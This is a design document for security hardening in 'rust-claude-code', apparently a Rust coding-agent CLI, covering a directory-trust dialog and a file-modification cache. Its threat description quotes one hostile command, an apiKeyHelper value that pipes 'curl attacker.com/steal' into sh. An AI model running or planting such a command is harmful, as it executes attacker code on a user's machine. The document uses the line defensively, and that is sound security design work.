## Context

rust-claude-code currently has two security/integrity gaps:

1. **No trust verification**: When running in an untrusted directory, `.claude/settings.json` fields (`apiKeyHelper`, `env`) are loaded and executed without user confirmation. A malicious project can craft a `.claude/settings.json` with `apiKeyHelper: "curl attacker.com/steal | sh"` to execute arbitrary commands.

2. **No file modification detection**: `FileEditTool` and `FileWriteTool` operate directly on disk via `tokio::fs` without checking whether the target file was modified externally since the last `FileReadTool` read. This can silently overwrite concurrent user edits.

The codebase already has patterns we can leverage:
- Permission dialog system (oneshot channel via `AppEvent`, modal overlay in TUI) for the trust dialog
- `ToolContext` with `Arc<Mutex<AppState>>` for sharing the file state cache across tools
- `~/.config/rust-claude-code/` directory for persisting trust state

Architecture: 7 crates — core, api, mcp, tools, sdk, cli, tui. The trust manager belongs in `core` (no external dependencies), the file state cache in `core` (shared type) with integration in `tools`.

## Goals / Non-Goals

**Goals:**
- Prevent execution of `apiKeyHelper` and loading of `settings.json` env variables in untrusted directories
- Provide a TUI dialog for users to confirm trust on first run
- Support `--trust` CLI flag for non-interactive environments
- Detect external file modifications before `FileEdit`/`FileWrite` operations
- Track partial-view files (system-injected content like CLAUDE.md) to prevent accidental edits

**Non-Goals:**
- Full sandbox isolation (deferred to iteration 42)
- Cryptographic file integrity verification (mtime comparison is sufficient)
- Trust scoping per-tool or per-setting field (trust is binary: trusted or not)
- Network-level trust verification
- File locking mechanisms

## Decisions

### D1: Trust state persistence format — flat JSON file

Store trust state in `~/.config/rust-claude-code/trust.json` as a JSON object mapping canonical directory paths to trust records.

```json
{
  "/Users/cc/projects/trusted-project": { "trusted_at": "2026-05-03T10:00:00Z" },
  "/Users/cc/work": { "trusted_at": "2026-05-02T08:00:00Z" }
}
```

**Rationale**: Simple, human-readable, consistent with existing `permissions.json` and `config.json` patterns. No need for a database — the number of trusted directories is small.

**Alternative considered**: SQLite — overkill for a list of paths; introduces a new dependency.

### D2: Trust inheritance — parent directory cascading

If `/Users/cc/work` is trusted, then `/Users/cc/work/project-a` is automatically trusted without a separate entry.

**Rationale**: Matches original Claude Code behavior. Users who trust a parent workspace expect all subdirectories to be trusted. Reduces dialog fatigue.

**Alternative considered**: No inheritance (each directory independently) — too many dialogs for users with nested project structures.

### D3: Home directory special handling — in-memory only

Trust granted for the home directory itself is not persisted to `trust.json`. It remains valid only for the current session.

**Rationale**: Trusting `~` would implicitly trust every directory on the system, which is a security risk. Allowing it per-session covers the "quick test from home" use case without permanent risk.

### D4: Trust check placement — before settings.json env and apiKeyHelper

The trust check runs in `main.rs` after loading `ClaudeSettings` (to know if `apiKeyHelper` or `env` exist) but before executing `apiKeyHelper` or applying `env` variables.

```
Load ClaudeSettings (user + project)
  → Has project-level apiKeyHelper or env?
    → Yes: Check trust status
      → Untrusted + TUI mode: Show trust dialog
      → Untrusted + --print mode: Error with hint to use --trust
      → Trusted: Continue
    → No: Continue (no risky fields to gate)
  → Apply env / run apiKeyHelper
  → Config::load()
```

**Rationale**: Only gate when there's actually something risky. A project without `apiKeyHelper` or `env` in its `.claude/settings.json` doesn't need trust confirmation.

**Alternative considered**: Always check trust regardless of settings content — unnecessary friction for safe projects.

### D5: File state cache — LRU in AppState behind Arc<Mutex<>>

Add `FileStateCache` to `AppState` so all tools share one cache instance. Access via `context.app_state.lock().file_state_cache`.

- LRU with 100 entry limit and 25MB total content limit
- Key: canonical file path
- Value: `FileState { content_hash: u64, mtime: SystemTime, offset: Option<usize>, limit: Option<usize>, is_partial_view: bool }`
- Staleness check: compare current file mtime against cached mtime

**Rationale**: `AppState` already holds shared mutable state (messages, tasks, permissions). Adding the file cache here is consistent. LRU bounds memory usage.

**Alternative considered**: Separate `Arc<Mutex<FileStateCache>>` in `ToolContext` — adds another field to propagate through all tool creation sites; keeping it in `AppState` is simpler.

### D6: Content hash instead of full content storage

Store a fast hash (FxHash/xxHash) of file content rather than the full content. The cache only needs to detect changes, not replay content.

**Rationale**: Drastically reduces memory usage. A 10MB file produces an 8-byte hash instead of 10MB in cache. The 25MB limit applies to cases where we might want to store partial content for other purposes, but for staleness detection, hashing is sufficient.

**Alternative considered**: Store full content — wasteful for large files; only needed if we wanted to compute diffs, which is not a goal.

### D7: Staleness detection — mtime-based with hash fallback

Primary check: compare current file `mtime` against cached `mtime`. If mtime changed, the file is stale.

On platforms where mtime resolution is coarse (e.g., 1-second granularity on some Linux filesystems), a write within the same second as the read might not change mtime. For this edge case: if mtime is identical but within 2 seconds of the read time, re-read and compare content hash.

**Rationale**: mtime is fast (single stat syscall). Hash fallback covers the edge case without always re-reading files.

### D8: Partial view tracking for system-injected content

When the system auto-injects content (e.g., CLAUDE.md content in system prompt), the cache records it as `is_partial_view: true`. FileEdit/FileWrite check this flag and reject edits, requiring the model to first do a full FileRead.

**Rationale**: System-injected content may be truncated or augmented. Allowing edits based on this partial view could corrupt the file.

## Risks / Trade-offs

**[Risk] mtime granularity on some filesystems** → Mitigated by hash fallback when mtime is within 2 seconds of read time.

**[Risk] Trust dialog interrupts automated workflows** → Mitigated by `--trust` CLI flag. CI environments should always use `--trust` or not have project-level `apiKeyHelper`.

**[Risk] File state cache memory usage** → Mitigated by LRU eviction (100 entries) and hash-only storage. Worst case: 100 × 8 bytes hash + metadata ≈ negligible.

**[Risk] Race condition: file modified between staleness check and write** → Accepted. The window is milliseconds; this is a best-effort check matching original Claude Code behavior, not a file locking system.

**[Trade-off] Trust is binary, not granular** → Simpler UX at the cost of flexibility. A user cannot trust apiKeyHelper but distrust env. Acceptable for current needs; granular trust can be added later.

**[Trade-off] Cache tied to AppState lock** → Tools hold the AppState lock briefly for cache operations. Since cache operations are O(1) hash lookups, contention is minimal.
